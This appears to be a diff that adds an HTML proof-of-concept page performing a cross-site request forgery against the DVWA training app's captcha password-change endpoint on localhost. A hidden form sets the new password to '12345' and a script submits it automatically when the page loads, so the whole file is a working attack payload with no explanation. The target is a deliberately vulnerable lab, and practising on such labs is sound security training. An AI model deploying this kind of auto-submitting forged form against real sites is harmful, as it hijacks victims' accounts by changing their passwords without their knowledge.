@@ -1,0 +1,8 @@
+<html><body>
+	<form name="CSRF" method="post" action="http://127.0.0.1/dvwa/vulnerabilities/captcha/">
+	<input type="hidden" name="step" value="2" />	
+	<input type="hidden" name="password_new" value="12345">
+	<input type="hidden" name="password_conf" value="12345">
+	<input type="hidden" name="Change" value="Change">
+	<script>document.CSRF.submit()</script>
+</form></body></html>
